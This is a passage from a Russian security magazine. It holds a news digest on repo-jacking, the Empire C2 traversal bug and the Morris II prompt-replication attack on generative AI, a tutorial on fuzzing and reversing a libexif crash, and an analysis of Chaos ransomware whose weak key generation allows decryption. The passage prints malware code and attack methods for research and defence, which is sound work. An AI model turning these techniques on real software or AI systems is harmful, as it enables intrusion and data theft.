   Если раз работ чик в своем коде нап рямую подключает сторонний код
из чужого репозитория и если автор этого репозитория удалил, перенес
или про дал свой аккаунт, то любой может пов торно зарегистрировать этот
аккаунт и поместить в нем вредонос ный код. Тогда все при ложе ния, которые
под клю чают код из этого репозитория, окажутся вредонос ными.





                  Описание атаки Repo Jacking

Лег кая победа для того, кто стре мится к массовому заражению зависимос-
тей. Именно поэтому исследователи нашей команды ART сде лали сле-
дующее:
 1. Извлекли все ссылки на GitHub из кода зависимостей в двух наиболее
   популярных пакет ных менеджерах для Python и JavaScript: PyPI и NPM.
 2. Уб рали дуб ликаты и прос каниро вали все ссыл ки на наличие репозитория.
  Все ссылки, вернувшие ответ 404, помети ли как corrupted_links.
 3. Все corrupted_links про верили  на  воз можность провес ти  атаку
   account takeover (захват аккаунта).

В результате получили ста тистику по репози тори ям GitHub, которые зло-
умыш ленник уже сейчас может захватить и использовать для рас простра-
нения вре донос ного кода в цепочке поставок. И опубликовали результаты
иссле дования, вместе с методи кой и инс трументами.


ÌÅÒÎÄ ÏÎÈÑÊÀ N-DAY-ÓßÇÂÈÌÎÑÒÅÉ Â ÁÈÍÀÐÍÎÌ ÊÎÄÅ

Я люблю и иногда прак тикую фаззинг для поиска дефек тов в ПО. Если сегод-
ня взять какой-нибудь непопу лярный таргет, подготовить стенд и запус тить
тес ты, то к концу недели можно будет найти пач ку интересных уязвимостей.
  В допол нение к уже известным техникам добавилось свежее исследова-
ние, которое нужно будет обязательно вос произвести: «BinGo: Identifying
Security Patches in Binary Code with Graph Representation Learning».
   Это крайне занима тельный метод поиска security-патчей в бинарном коде
при ложе ний. Акту ален он для тех случаев, ког да вла делец при ложе ния скры то
исправ ляет какие-нибудь уяз вимости в сво ем коде без регистрации CVE
или без упоминания в ченжлоге. Метод BinGo позволя ет выявлять n-day-уяз-
вимос ти.
   Тех ника осно вана на представлении бинарного файла в виде Code
Property Graph — промежуточном представ лении кода, изна чально раз-
работанном для ана лиза его безопасности. CPG включает в себя абстрак-
тное синтаксическое дерево, граф потока управления и зависи мос ти данных.
  Особенность этого метода заключа ется в новой модели обнаружения свя-
занных с безопасностью исправлений, которая сравнивает бинарные фай лы
до и после изменений. И использует для это го сиамскую нейросеть, которая
позволя ет выявить сходство или различие между бинарями.
   Уро вень обнаружения security-пат чей сре ди про чих модификаций бинар-
ного кода — 80,77%. Отлично! Оста лось подобрать интерес ные таргеты.
   Идея: а что, если использовать этот метод для выявления умышленно
оставленных зак ладок в бинар никах? Если мы выдвигаем гипоте зу о том, что
это возможно, то для ее проверки нам понадобит ся:
 1. Найти при мер (семплы) модификаций кода, которые точно являются зак-
   ладками.
 2. Сфор мировать CFG для подоб ранных семплов.
 3. Обучить сиамскую  сеть  для определения  сходства  заданного CFG
   с целевым CFG, полученным из семплов.

Возможно, ты читал мою статью «Как провести свое пер вое security-иссле-
дование». Мне кажется, про верка выдвинутой выше гипоте зы будет отличной
темой для такого иссле дования!


ÀÒÀÊÀ ÍÀ ÀÒÀÊÓÞÙÅÃÎ: RCE Â ÏÎÏÓËßÐÍÎÌ ÔÐÅÉÌÂÎÐÊÅ
EMPIRE

Те, кто исполь зовал опенсорсный инстру мент Empire для пентеста и ред-
тиминга, зна ют о его богатых возможностях, которые пригождаются при пос-
тэксплуатации.
  Фреймворк состоит из четырех ком понентов, один из которых — Agent.
Его задача — установить канал управления ата куемым хостом и эксфиль тра-
ции данных с него.
   Уяз вимость,  которая позволяет выполнить обход  каталога  (directory
traversal), обнаруже на в ком муникации меж ду аген том и сервером управле-
ния. Можно под менить запросы агента и заг рузить на сер вер любой файл
в произволь ной директории. Для этой уяз вимости уже доступен PoC, поэтому,
пентесте ры и редтимеры, проверяйте свою инфраструк туру на наличие
имплантов.


ÒÎÏ-10 ÒÅÕÍÈÊ ÀÒÀÊ ÍÀ ÂÅÁ-ÏÐÈËÎÆÅÍÈß Â 2023 ÃÎÄÓ

Компания PortSwigger при поддержке сооб щества ресерчеров и багханте ров
составляет рей тинг исследова ний безопас ности веб-приложе ний. Кстати,
в рейтинге 2021 года отметилось исследова ние нашей команды, которое
было пос вящено технике JS prototype pollution.
  В 2023 году первое место в рей тинге заняло исследование Smashing
the state machine: the true potential of web race conditions, в котором автор под-
све тил новые аспекты атак race condition в современных приложе ниях.


ÎÏÓÁËÈÊÎÂÀÍ NIST CYBERSECURITY FRAMEWORK V.2

Об новился фрей мворк, который организа ции по все му миру используют
для пос троения про цессов информацион ной безопасности и управления
рисками. Основные об новления:
 • расширен скоуп при менения: теперь в фокусе не только критически важ-
   ная инфраструктура, но и организа ции любого раз мера;
 • Govern: добав лена новая функция, которая выделя ет приоритет политикам
   управления ИБ;
 • до бав лен новый раздел Supply Chain  Risk Management, призванный
   помочь защититься от атак на цепочки поставок;
 • Implementation Examples: обновляемые при меры внедрения рекомен-
   даций.

Пре дыдущая вер сия фреймворка описывала пять функций жизненного цик ла
ИБ:
 • Identify — опре деле ние ресурсов, которые нуж но защищать;
 • Protect — определение мер защиты для каж дого ресур са;
 • Detect — выявление инци дентов и новых угроз;
 • Respond — реагирование на инцидент с целью снижения последствий;
 • Recover — опре деле ние мер восстановления пос ле инцидента.

Во вто рой вер сии фреймворка этот список пополнится новой функци ей. Я
ожи дал, что это будет что-то вроде Predict, как в модели адаптивной безопас-
ности, про которую расска зал в статье «Проект Red Team». Этот раздел
мог бы раскрыть суперсилу ИИ для предик тивной аналитики и прогнозиро-
вания угроз. Но нет: в новой версии будет представлена функция Govern,
которая закрепит полномочия человека в управлении политиками и ролями
ИБ. При дется делать свой апдейт к это му фреймворку и опи сывать функцию
прогнозирования!


ÏÎÈÑÊ ÑÅÊÐÅÒÎÂ Â ÂÈÄÅÎÊÎÍÒÅÍÒÅ

Мы уже умеем искать секреты в исходном коде (пароли, токены, API-ключи).
Иссле дователи GitLab опубликова ли метод и инс трумент поис ка секретов
в видео.
   Как эта ути лита работает: видеозапись разбивается на кадры, в каждом
кадре с помощью OCR рас познается текст, в полученном тексте про водится
поиск паттернов.
  Инструмент можно использовать для целенап равленного поиска секретов
в виде озаписях рабочих встреч, а также для их монито ринга и массового сбо-
ра данных в пуб ликуемом контенте на различных площадках, например
в соци альных сетях и на видеохостингах.





     Фун кциональная схема работы инструмента для поис ка секретов


MORRIS II — ÏÅÐÂÛÉ ÂÈÐÓÑ, ÀÒÀÊÓÞÙÈÉ ÃÅÍÅÐÀÒÈÂÍÛÉ ÈÈ

Гром кий заголовок ис следования, в котором авто ры используют уязвимос ти
генера тив ного ИИ для вредоносных действий, сразу наводит на мыс ли о том,
что целью было просто привлечь внимание. Давай раз беремся, есть ли тут
что-то разум ное или же один хайп.
  Иссле дователи сформировали запросы, которые провоцируют ML-модель
генери ровать на выходе то же, что атакующий пода ет на вход. В результате
получается заставить модель вос произвести запрос атакующе го и выполнить
вре донос ное действие. И это вредонос ное действие может быть направлено
на другие ком поненты, которые работают в одной экосистеме с этой
моделью.





                       Схема ата ки Morris II

Ата ка проходит без вмешательства поль зователя, но я бы все же не стал
называть эту футуристичную малварь чер вем. Скорее это что-то вро де SSRF:
можно манипу лировать ком понентами экосистемы, в которой находится уяз-
вимая модель. Но чтобы был настоящий червь, нуж но, наверное, чтобы
модель начала отправлять зап росы за пределы своей экосис темы другим
подоб ным ML-моделям.
  Поэто му концепт ата ки на продук ты интерес ный, но сравнение c Morris,
на мой взгляд, немного не к месту. Ни по прин ципу работы, ни по потен циаль-
ной разрушительности.
ВЗЛОМ





Когда я только начал вли ваться в мир
хакерства, мне дико не хва тало информа-
ции, ее приходилось собирать по крупицам.
В этом материале я постарался изло жить
то, чего мне тогда не дос тавало, — всю            AFANX                                                                                       Реверс-инженер
информа цию по реверсу в сжатом и сис-      лаборатории инновационных                                                                                               технологий
тематизиро ванном виде. А для наглядности         и кибербезопасностиAP Security
мы с тобой раз берем боевую задачу —
реверс прог раммы libexif.


Эта статья нацеле на на людей, которые пос тепенно вырастают из тас ков
на CTF катего рии PWN и Reverse, хотят пощупать реальные программы
и понять, что такое настоящий ана лиз бинаря. Ресер чи, которые пишут спе-
циалис ты известных компаний, хороши, но большинс тво новичков не знают,
с чего начинать делать такое исследова ние, как тре ниро ваться и как заполу-
чить стенд. Сегод ня мы с тобой это испра вим.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.



ÏÐÈÌÅÐÍÛÉ ÏÎÐßÄÎÊ ÄÅÉÑÒÂÈÉ ÄËß ÁÈÍÀÐÍÎÃÎ ÐÅÑÅÐ×À

Давай разложим по пунктам все дей ствия, которые ресерчер может произво-
дить с анализируемым бинарным файлом.
 1. Ñáîð èíôîðìàöèè î òàðãåòå:
    • что за бинарь, для чего он предназначен, для какой платформы, есть ли
     исходный код в открытом доступе, или это «черный ящик»;
    • как собирать бинарь — есть ли setup.sh или install.sh , может,
     нуж но прос то скомпилить при помощи GCC;
    • как им пользоваться: пос мотреть воз можнос ти программы, что она
     дела ет и как с ней вза имо действу ет пользователь.
 2. Çíàêîìñòâî ñ áèíàðåì — применение средств пер вичного анализа.
   Вот самые ходовые тулзы:
    • file — системная ути лита, которая поз воляет узнать тип данных внутри
     файла;
    • checksec — ути лита, которая про веря ет первичные средства безопас-
     ности в бинаре;
    • xxd — отоб ражает файл в виде шес тнад цатеричных кодов или выпол-
      няет обратное преобразование;
    • strings — утилита, при меняемая для поис ка печатаемых строк в дво-
     ичных фай лах;
    • VirusTotal — бесплатная служба, ана лизи рующая подоз рительные
     файлы и ссылки на пред мет наличия вирусов, червей, троянов и все-
     воз можных вре доносных прог рамм;
    • DIE — ути лита для опре деления типов фай лов. Кто читал книгу «Вскры-
      тие покажет! Практический анализ вредонос ного ПО», тот дол жен знать
      утилиту.
 3. Ôàç çèíã ïðîãðàììû (если это требуется). Это техника поис ка потен-
   циаль ных  уязвимостей  в  авто мати чес ком  или  полуавтоматичес ком
   режиме. Здесь нам помогут:
    • AFL++ — собирает информа цию о покрытии для каждого измененного
     входного значения и помогает обнаружить новые пути выпол нения
     и потенциальные баги;
    • LibFuzzer — фреймворк для обна ружения ошибок в коде, созданный
      в основном для тестирова ния прог рамм на C/C++, но поддержи вает
     и другие языки;
    • ñàìîïèñíûé ôàç çåð — этот метод используется, ког да программа
     специфич ная или использовать известные фаззеры не имеет смысла
     или  нет  воз можнос ти.  Пример  можешь  посмотреть  в  пос те
     на codeby.net;
    • ðó÷ íîé ôàç çèíã — по сути, просто тыкание программы, как в тасках
     на CTF. Ресерчер просто пода ет случайные данные программе вруч-
      ную.
 4. Ðå âåðñ. Этот шаг важен, и думаю, что пояснения тут не нужны. Информа-
   ции в интернете пол но, смотри, нап ример, подборку статей «Ре верс мал-
   вари». Здесь же перечис лю основные ути литы:
    • IDA Pro — это самая извес тная прог рамма для дизас сем блирования,
      в представ лении она не нуждает ся. Как ей пользоваться, можно
      почитать, например, в кни ге Рикар до Нарвахи The IDA Pro Book (дос-
      тупен любительский перевод);
    • ImmunityDBG — отладчик прог рамм для ОС Windows. Скачать можно
     на официальном сайте;
    • EDB    Debugger   —     кросс-плат форменный     отладчик
     для AArch32/x86/x86-64. В дан ный момент официально дос тупен толь-
      ко на Linux, но уже готовятся порты для FreeBSD, OpenBSD, macOS
     и Windows;
    • GDB Debugger — перено симый отладчик проекта GNU, работает
     на мно гих UNIX-подоб ных системах и помогает отла живать многие язы-
      ки программирования, вклю чая C/C++, Free Pascal, FreeBASIC, Ada,
    фортран и Rust;
    • Ghidra — этот фреймворк для реверса соз дан в АНБ США и включает
      в себя набор пол нофункциональных высококлассных инструмен тов
     ана лиза программ. Работа ет на Windows, macOS и Linux. Подробнее
     о нем можно прочесть в стать ях «Ghidra vs IDA Pro» и «Ghidra vs
     crackme»;
    • radare2  —   свободный    кросс-платформенный   фреймворк
     для реверс-инжиниринга, вклю чает дизас сем блер, шестнадцатеричный
     редак тор,  анализатор  кода  и  про чие  полезности.  Используется
     при ревер се, отладке вредонос ного ПО и прошивок. Ска чать можно
     с GitHub;
    • Eclipse-CDT — это программа для реверса, в которой мож но пос-
     мотреть место падения прог раммы в исходном коде по фай лу, который
     вызывает краш.
 5. Íàïèñàíèå ýêñïëî èòà. Пишем код, который будет эксплуатировать уяз-
   вимость. Здесь все зависит от твоих умений и предпочтений, а также
   от того, что мы эксплу атируем и на какой платформе.


ÑÁÎÐ ÈÍÔÎÐÌÀÖÈÈ Î ÒÀÐÃÅÒÅ È ÇÍÀÊÎÌÑÒÂÎ Ñ ÁÈÍÀÐÅÌ

Из названия статьи ты уже знаешь, что будем пыв нить libexif версии 0.6.14.
Давай познакомимся с нашим таргетом поближе.
    Libexif — это библиотека для разбора, редактирования и сохранения дан-
ных EXIF, то есть зашитых в некото рые изоб ражения метаданных.
  Давай теперь найдем какую-нибудь прог рамму с этой биб лиоте кой
на роль подопытного. Благо на просторах GitHub этого добра сколько угодно.
Один из самых простых вариантов — программа exif. Это небольшая утилита
коман дной строки для отображения информа ции EXIF. Написана она как раз
для того, что бы демонстрировать воз можности libexif.
  Для начала скачаем и соберем таргет:


mkdir libexif && cd libexif/
wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_
6_14-release.tar.gz
tar -xzvf libexif-0_6_14-release.tar.gz

Собираем и устанав лива ем libexif:


cd libexif-libexif-0_6_14-release/
sudo apt-get install autopoint libtool gettext libpopt-dev
autoreconf -fvi
./configure --enable-shared= no --prefix="$PWD/fuzzing_libexif/
install/"
make
make install

Библиотека готова, теперь скачаем и соберем использующую ее программу:


cd $PWD/fuzzing_libexif
wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-
release.tar.gz
tar -xzvf exif-0_6_15-release.tar.gz

Собираем exif:


cd exif-exif-0_6_15-release/
autoreconf -fvi
./configure --enable-shared= no --prefix="$PWD/fuzzing_libexif/
install/" PKG_CONFIG_PATH=$PWD/fuzzing_libexif/install/lib/pkgconfig
make
make install

Пос ле сборки можно запускать программу.





Давай поп робуем и посмотрим, как прог рамма работа ет. Из описания понят-
но, что на вход нужно подать картинку, поэто му скачаем из того же репози-
тория примеры картинок.


mkdir in; mkdir out; cd in
wget https://github.com/ianare/exif-samples/archive/refs/heads/
master.zip
unzip master.zip

Ко ман да mkdir in; mkdir out; cd in создаст две директории: /in и /out,
а затем перейдет в директорию /in. Эти папки потом понадобятся нам
при фаззинге.
  Запускаем прог рамму:


./exif Canon_400.jpg

И видим результат ее работы.





Отлично! С работой программы разобрались.


ÔÀÇÇÈÍÃ

Те перь настало время фаззинга. Он поможет нам напасть на след потен-
циальных багов.
  Для фаззинга у нас есть тесткейсы и наш скромный опыт общения с прог-
раммой.
  В качестве средс тва фаз зинга я буду использовать AFL++. Давай уста-
новим его.


Óñòàíîâêà AFL++
Ставим зависимости:


sudo apt-get update
sudo apt-get install -y build-essential python3-dev automake git
flex bison libglib2.0-dev libpixman-1-dev python3-setuptools
sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo
apt-get install -y lld llvm llvm-dev clang
sudo apt-get install -y gcc-$(gcc --version|head -n1 |sed 's/.* //'
|sed 's/\..*//')-plugin-dev libstdc++-$(gcc --version|head -n1 |sed
's/.* //' |sed 's/\..*//')-dev

Качаем AFL++ из официального репозитория и устанавливаем:


cd $HOME
git clone https://github.com/AFLplusplus/AFLplusplus && cd
AFLplusplus
export LLVM_CONFIG="llvm-config-11"
make distrib
sudo make install

Пос ле сборки мож но запустить бинарь afl-fuzz и пос мотреть краткую
справку.





Об использовании AFL++ советую эти статьи:
 • Фаззинг с AFL++. Зна комство
 • Сре ди ублюдков шел артист. PoC CVE-2023-2663
 • Наденьте на ноги мои стальные кандалы. Параллельный фаззинг AFL++

У AFL++ есть форк WinAFL. По нему рекомендую эти статьи:
 • Luke, I am your fuzzer. Авто матизируем поиск уязвимос тей в программах
 • WinAFL на практике. Учимся работать фаз зером и искать дыры в соф те



Запускаем фаззер:


afl-fuzz -i /path/to/testcases -o /path/to/crashes /path/to/binary @@

Здесь
 • -i /path/to/testcases указывает на путь к тесткей сам;
 • -o /path/to/crashes — место, куда будут попадать краши;
 • @@ — этот параметр озна чает, что на ввод будут пос тупать данные
   при запуске программы. Гру бо говоря, через argv[] , а не через scanf(
  ) .

Пос ле запуска появится окно фаззера.





В нашей лаборатории есть продукт, где про цесс запуска фаззера автомати-
зирован вплоть до вывода отчета. Он называется S0NGB1RDZ.





Действия все те же самые, как и выше, только в одной утилите. Таким обра-
зом, фазер можно запус тить в четыре шага. На скриншоте ниже — опции
для фаззинга.





И вот результат запус ка фаззинга в S0NGB1RDZ.





Спустя некоторое время в правом верхнем углу можно увидеть найденные
краши.





Все най денные краши хранятся по пути /your_directory/out/default/
crashes.





С фаззингом закончили, настало вре мя для реверса!


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



         ТРЕНИРУЕМСЯ АНАЛИЗИРОВАТЬ
         БИНАРНЫЕ ФАЙЛЫ НА ПРИМЕРЕ
                                      LIBEXIF





ÐÅÂÅÐÑ

Тут есть два пути. Пер вый — трушный и хардовый: использовать GDB и там
отсле живать цепочку вызовов, потом ревер сить в IDA Pro. Однако, когда есть
исходный код, можно облегчить себе задачу и прибегнуть к Eclipse-CDT.
Спойлер: мы дальше будем использовать все эти инстру менты.


Eclipse-CDT
Eclipse-CDT — это сре да разработ ки на C и C++, основанная на платформе
Eclipse. Сре ди ее возможностей — нас тройка управляемой сборки для раз-
ных тулчейнов, стандар тная сборка make, навигация по исходному коду, раз-
нооб разные инструменты исследова ния кода, инс трументы рефакторинга
и генерации кода, а так же инструменты для визуальной отладки, включая
прос мотр памяти, регистров и дизас семблера.
   Так как программа написана на Java, необ ходимо скачать Java SDK:


sudo apt install default-jdk

Скачаем программу и распакуем ее:


wget https://www.eclipse.org/downloads/download.php?file=/technology/
epp/downloads/release/2021-03/R/eclipse-cpp-2021-03-R-linux-gtk-x86_
64.tar.gz](https://www.eclipse.org/downloads/download.php?file=/
technology/epp/downloads/release/2021-03/R/eclipse-cpp-2021-03-R-
linux-gtk-x86_64.tar.gz
tar -xzvf eclipse-cpp-2021-03-R-linux-gtk-x86_64.tar.gz

В ито ге распаковки получаем набор файлов, среди которых будет исполня-
емый файл eclipse. Запускаем его.





Нас встре чает вот такое, вполне информа тивное окош ко.





В меню выбираем File → Import, после это го зада ем язык программирова ния,
в нашем случае это C/C++. Выбираем пункт Existing Code as Makele Project,
пос коль ку у нас есть makele.




                       Makele —  это  файл,  который  использует ся
                       для  автоматизации сбор ки и компилирования
                       программ. Он содер жит все необходимые про-
                       верки, настрой ки и коман ды.





Далее называем проект, выбираем директорию с программой, в которой
при сутствует makele, и ука зываем ком пилятор — Linux GCC.





Следующий шаг — подготовка параметров отладки. Переходим на вкладку
Run → Debug Congurations.





Далее выбира ем C/C++ Application, а на вкладке Main — нужный про ект.
На вкладке Arguments вста вим путь до нашего краш-файла.





Те перь жмем Debug и попада ем в главное окно.





В левом списке мож но уви деть ошиб ку Segmentation fault, что означает потен-
циальное переполнение буфера. Также мы видим мес та в коде, где была
обнаружена эта ошиб ка.





Те перь нужно понять, почему воз ника ет ошиб ка и как это мож но проэкс плу-
атировать.
  Идем копаться в интернете и узна ём, что эти ошибки потенциально могут
быть свя заны или с переполнением кучи (CVE-2009-3895), или с обычным
отка зом в обслуживании, которое толком ни к чему не приводит (CVE-2012-
2836). Пока что нельзя с уверенностью сказать, к какой именно CVE относят-
ся эти краши, поэтому про должим изучение.
  Просмотрев потенциально уяз вимые места, которые выявила Eclipse-CDT,
я обнаружил функцию exif_data_load_data_thumbnail().





Однако опре делить, почему упала программа и что в это время происходило
с памятью, в Eclipse-CDT у меня не получилось. Поэтому переходим к GDB.


GDB
GDB пригодится нам, что бы определить цепочку вызовов функций.
   Загружаем программу в GDB и запус каем с указани ем краш-файла:


gdb -q exif
run crash.jpeg





Отловить место падения нам поможет коман да bt.





                   bt — это команда в GDB, которая отобража ет
                         стек вызовов для текущего потока. Стек вызовов
                      содер жит информацию о функциях, вызываемых
                        в текущей точ ке программы. GDB выведет спи-
                          сок, начиная с самой высокоуров невой функции
                      и закан чивая функцией, в которой произош ла
                    ошибка.


Программа упа ла в этой функции, при чем внутри этой функции, видимо, про-
исхо дит копиро вание чего-то в кучу. Этот факт подтвержда ет участок кода,
на котором оста новился отладчик, а также регис тры.





На самом деле понят но, почему произо шел краш. Регистр rsi указыва ет
на пустую ячейку динамичес кой памяти. Так как такого чан ка не существует,
а программа пытается перенести его в xmm0, воз никает ошибка. Вот этот
участок кода доказывает нашу догад ку:


0x7ffff7cc498d <__memmove_sse2_unaligned_erms+13> movups xmm0,
xmmword ptr [ rsi]


IDA Pro
Под клю чаем к делу IDA Pro, чтобы понять, что происходило до момента
вызова уязвимой функции. Мы можем полностью восстановить цепочку
вызовов и опре делить место падения прог раммы. Давай пройдемся по всем
сра ботав шим функциям:
 • main() заг ружает файл, а затем вызывает exif_loader_get_data()
   для генерации ExifData;
 • exif_loader_get_data() зап рашивает мес то для ExifData и затем
   вызывает exif_data_load_data() для чтения потока байтов из адреса
  loader->buf длиной loader->bytes_read. Проще говоря, выделяется
  место для чтения фай ла;
 • exif_data_load_data() проверя ет заголовок, пос ле чего вызывает
  exif_data_load_data_content() ;
 • exif_data_load_data_content()  считыва ет  количество  записей,
   и  для  каждой  выполняется  маршру тиза ция  по  тегу.  Если  тег —
  EXIF_TAG_JPEG_INTERCHANGE_FORMAT_LENGTH , то есть 0x0202, то
   счи тыва ется длина мини атюры. Если значение thumbnail_offset уже
   установлено, то вызывается exif_data_load_data_thumbnail, чтобы
   разоб рать миниатю ры;
 • exif_data_load_data_thumbnail() копирует данные в динамичес кую
   память и дальше выводит на экран.

Разберем подробнее последнюю функцию.
  В ее начале идет про верка размера и сме щения, если их сумма боль ше
числа ds, то программа завершается.





Пос ле это го про веряется память: если она выделе на, то очищается.





Дальше выделяется новая память и проверя ется, выделе на ли она.





Пос ледний блок, который у меня выделен красным, и есть мес то, в котором
программа падает.
   У функции void memcpy(void *dest, const void *src, size_t n) три
аргумента:
 • *dest — указатель на область памяти, в которую будут скопированы дан-
   ные;
 • *src — указатель на область памяти, из которой будут скопированы дан-
   ные;
 • n — количество байтов, которые нужно ско пиро вать.

В контексте исследуемой прог раммы для memcpy() первый аргумент — дан-
ные, вто рой аргумент — смещение, третий аргумент — раз мер.
   Благодаря GDB я выяс нил, что регистр rdx хра нит в себе размер, регистр
rsi — указатель на область памяти, из которой надо копировать, а сме щение
хранится в регистре rbp. Причем адрес rsi получается путем сложения сме-
щения и начала адреса кучи, в которую был загружен файл. Это под тверждает
инструкция lea rsi, [r13+rbp+0] и регис тры.





В регистре rbp хранится значение 0x00000000FFFFFEC3, которое явля ется
перемен ной oﬀset. В регистре r13 — ука затель на кучу 0x000055F902C7C9A6.
Пос ле сло жения получа ем значение 0x55fa02c7c869, которое хранится в rsi
и указывает в никуда. Собс твенно, что и требовалось доказать.
  Продебажив программу еще несколько раз, я понял, что все эти зна чения
берутся из самого файла, а не вычисляются. Я открыл краш-файл в HEX-
редак торе  и  по  сиг натуре  нашел  зна чение  для  переменной  oﬀset
0x00000000FFFFFEC3 и размер 0x8cb.





То есть если изме нить эти зна чения и заг рузить в программу, то можно
попасть в какой-то другой чанк и перетереть его. Одна ко, иссле довав память,
я выяснил, что никуда это не приводит и проэксплу атировать этот баг
не получится. Поэто му, к сожалению, до полного роадмэпа взлома мы в этот
раз не дотянули.


ÂÛÂÎÄÛ

В этой статье я постарался показать шаги реверсера на реаль ном кейсе.
К велико му сожалению, на практике бывает такое, что уязвимость не получа-
ется про эксплуати ровать и баг приводит толь ко к отказу в обслу жива нии.
Однако в процессе мы научились искать и собирать таргет, фаз зить исполня-
емый файл, пользовать ся ста тическим анализатором кода и иссле довать уяз-
вимое место в бинаре. Думаю, время потрачено не зря!




                    Похожие задачки ты можешь найти в репозитории
                       Анто нио Моралеса Fuzzing 101.
ВЗЛОМ





Иног да вирусным аналити кам уда ется бес-
платно расшифровать файлы, за вос ста-
нов ление которых тро яны-энко деры тре-
буют  очень  мно го  денег. Со  сто роны
это выглядит нас тоящей магией, но в ее                   j0rtxf                                                                                   CSIRT (PT ESC), Positive
осно ве лежат исследования и знания о том,               Technologies                                                                                 ko1mbo656@gmail.com
как  работают  вре доносные  программы.
Сегодня мы разберемся в принципах дей-
ствия таких тро янов на примере реального
энко дера и напишем программу — декодер
зашиф рованных им фай лов.


Во вто рой половине 2023 года команда Positive Technologies по рас сле дова-
нию инци дентов PT CSIRT (PT Expert Security Center) разбирала происшес-
твие в инфраструктуре одного из своих заказ чиков. Спе циалисты пришли
к выводу, что за случив шимся сто ят предста вители хакерской группировки
Twelve. Груп па позициони рует себя как хактивис тов политичес кой направлен-
ности и выбирает себе цели среди россий ских ком паний и учреждений. Счи-
тается, что эта группа тесно связана с груп пиров кой Shadow, сменившей наз-
вание сначала на C0met, а с недавних пор, вероятно, скрывающей ся
под именем Darkstar.
  Судя по схо жему почер ку и инструмен тарию, эти две группировки явля-
ются частью одной команды и отвечают за разные направле ния. Обе исполь-
зуют в ходе атак различные вари анты шифровальщиков, преиму щес твенно
семей ства LockBit/Babuk. Но если хакеры из Shadow занимаются вымога-
тель ством, назначая выкуп за ключ дешифровки, то представители Twelve
прос то стре мят ся нанести максимальный ущерб целевой инфраструктуре,
при этом публикуя в открытом доступе результаты своей работы, которые
иногда вклю чают в себя выгруженные из инфраструк туры чувс твитель ные
данные.


ÈÍÖÈÄÅÍÒ

В ходе расследования инцидента специалис ты обнаружили очень подоз-
рительный исполняемый файл с именем twelve.exe. Его анализ показал, что
вместо при вычного LockBit зло умышленники использовали шифроваль щик,
относящий ся к семейству программ-вымога телей Ryuk / Chaos / Yashma /
Obsidian ORB, который использовался во мно жес тве вредонос ных кам паний
по все му миру.





  1,4 тысячи загруженных вредонос ных семплов chaos ransomware
  на VirusTotal

Су дя по ряду приз наков, для генерации вредонос ного фай ла, скорее всего,
использовался пуб лично дос тупный конструктор Chaos Ransomware Builder,
который поз воля ет злоумыш ленникам кас томизи ровать вре доносные прог-
раммы-шифровальщики. С его помощью, например, можно изменить имя
про цесса, имя фай ла с требованиями, текст самих тре бований, задать спи-
сок расширений шифруемых файлов, сбилдить дек риптор и так далее.





               Ин терфейс Chaos Ransomware Builder

Сам троян написан на .NET, бла годаря чему можно изучить его функции, нап-
ример в DNSpy.





                 Список функций шиф ровальщика

Пробежав шись по основным функциям, исследователи выяс нили, что этот
энкодер шиф рует файлы с использовани ем алго ритма AES, затем зашиф-
ровывает клю чи AES встроенным откры тым RSA-ключом и записы вает их
в конец зашифрованных фай лов.


ÏÓÁËÈ×ÍÛÉ RSA-ÊËÞ×

Для каждого шифруемого файла троян генерирует инди виду альный AES-
ключ:


string text = Program.CreatePassword(40); // Генерация ключа AES
if (fileInfo.Length < (long)((ulong)-1926258176)) // Проверка
размера файла
{
 if (Program.checkDirContains(files[i]))
 {
  string keyRSA = Program.RSA_Encrypt(text, Program.rsaKey()); //
Шифрование AES-ключа публичным RSA-ключом
  Program.AES_Encrypt(files[i], text, keyRSA); // Шифрование файлов
 }
}


В первую оче редь было интересно понять, каким образом генери руется ключ
для AES. Функция генера ции ключа выглядит сле дующим обра зом:


public static string CreatePassword(int length)
  {
   StringBuilder stringBuilder = new StringBuilder();
   Random random = new Random();
   while (0 < length--)
   {
    stringBuilder.Append(
"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&
?&/"[random.Next(
"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&
?&/".Length)]);
   }
   return stringBuilder.ToString();
  }

Ключ генери рует ся отдельно для каждого файла на основе функции Random,
при этом Random запускает ся без сида. Если в DNSpy перейти в объ явление
класса Random, то мы увидим следующее.





То есть Random, выз ванный без сида, в качес тве начального исполь зует зна-
чение Environment.TickCount. Важно отметить,  что  это  справедливо
для приложений .NET версии 4, генера ция рандома для версий 5 и выше
использует другие начальные значения.
   Environment.TickCount — это количество миллисекунд, прошед ших
с момента запуска системы. Таким образом, мож но предположить, что, зная
зна чение сида, мы в состоянии «уга дывать» случайные зна чения.
  Проверим наши предположения. Возьмем функцию CreatePassword
из вре доноса, добавим  туда вывод  текущего  значения Environment.
TickCount и сгенери рованного пароля, а затем выведем полученные зна-
чения в консоль:


using System;
using System.Text;


namespace test1
{
 class Program
 {
  static void Main(string[] args)
  {
   string s = CreatePassword(40);
   Console.WriteLine("Key: " + s);
  }


 public static string CreatePassword(int length)
 {
  StringBuilder stringBuilder = new StringBuilder();
  Random random = new Random();
  while (0 < length--)
  {
   stringBuilder.Append(
"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&
?&/"[random.Next(
"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&
?&/".Length)]);
  }
  Console.WriteLine("Environment.TickCount: " + Environment.TickCount
);
  return stringBuilder.ToString();
 }
}
}

В результате запус ка программы получаем следующие зна чения:



  C:\temp>1.exe
  Environment.TickCount: 264152453
  Key: &Cer88Tf8sErkcxYAgR5CvdawGij/JqSEVOln8m/


Те перь организуем добавление сида в фун кцию генерации ключа и переда-
дим туда значения TickCount из предыдущего запуска:


static void Main(string[] args)
  {
   int seed = 264152453;
   string s = CreatePassword(40,seed);
   Console.WriteLine("Key: " + s);
  }


